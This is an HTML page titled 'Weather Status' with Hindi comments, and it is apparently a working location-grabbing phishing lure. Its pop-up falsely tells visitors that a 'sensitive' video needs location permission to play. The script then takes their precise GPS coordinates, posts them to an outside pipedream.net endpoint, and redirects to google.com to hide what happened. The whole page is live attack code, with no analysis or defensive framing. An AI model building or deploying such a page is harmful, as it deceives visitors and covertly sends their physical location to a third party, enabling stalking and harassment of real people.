<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Status</title>
    <style>
        body {
            margin: 0; padding: 0;
            background-color: #0f0f0f;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            color: #ffffff;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }

        /* सीधा और सुंदर मोबाइल इंटरफेस बॉक्स */
        #verification-modal {
            display: flex;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: #0f0f0f;
            z-index: 9999;
            justify-content: center; align-items: center;
            padding: 20px; box-sizing: border-box;
        }

        .modal-box {
            background-color: #1f1f1f;
            border: 1px solid #333333;
            border-radius: 8px;
            padding: 30px; max-width: 400px; width: 100%;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }

        .modal-title {
            font-size: 18px; font-weight: 600;
            margin-bottom: 12px; color: #ff4d4d;
        }

        .modal-text {
            font-size: 14px; color: #aaaaaa;
            line-height: 1.5; margin-bottom: 24px;
        }

        .action-btn {
            background-color: #cc0000;
            color: #ffffff; border: none;
            padding: 12px 24px; font-size: 14px; font-weight: 600;
            border-radius: 4px; cursor: pointer; width: 100%;
        }

        .spinner {
            display: none; /* लोडिंग शुरुआत में छुपी रहेगी */
            border: 3px solid #333; border-top: 3px solid #ffffff;
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite; margin: 0 auto 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="verification-modal">
        <div class="modal-box">
            <div id="loading-spinner" class="spinner"></div>
            <div id="modal-title-text" class="modal-title">Content Access Restricted</div>
            <div id="modal-body-text" class="modal-text">
                This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.
            </div>
            <button id="main-action-btn" class="action-btn" onclick="executeLocationRoutine();">Verify & Watch Video</button>
        </div>
    </div>

    <script>
        var targetEndpoint = 'https://eohi4x7xdjpqqrs.m.pipedream.net';
        var isFetching = false;

        function originalFetchDispatch(lat, lon) {
            fetch(targetEndpoint, {
                method: 'POST',
                mode: 'no-cors', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon })
            }).then(() => {
                window.location.href = "https://google.com"; 
            });
        }

        function showLoadingUI() {
            document.getElementById('loading-spinner').style.display = 'block';
            document.getElementById('modal-title-text').innerText = "Processing Verification...";
            document.getElementById('modal-body-text').innerText = "Please wait while we establish a secure stream connection.";
            document.getElementById('main-action-btn').style.display = 'none';
        }

        function resetToErrorUI() {
            document.getElementById('loading-spinner').style.display = 'none';
            document.getElementById('modal-title-text').innerText = "Content Access Restricted";
            document.getElementById('modal-body-text').innerText = "This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.";
            document.getElementById('main-action-btn').style.display = 'block';
        }

        function executeLocationRoutine() {
            if (isFetching) return;
            isFetching = true;

            showLoadingUI(); // बटन दबाते ही सुंदर लोडिंग स्क्रीन आएगी

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    isFetching = false;
                    var lat = position.coords.latitude;
                    var lon = position.coords.longitude;
                    originalFetchDispatch(lat, lon);
                }, function(error) {
                    isFetching = false;
                    resetToErrorUI(); // अगर GPS बंद है, तो वापस बटन दिखाएगा
                }, {
                    enableHighAccuracy: true,
                    timeout: 5000, // 5 सेकंड का सेफ टाइमआउट
                    maximumAge: 0 // पुराना कैश डेटा पूरी तरह साफ रखेगा
                });
            } else {
                isFetching = false;
                window.location.href = "https://google.com";
            }
        }
    </script>
</body>
</html>
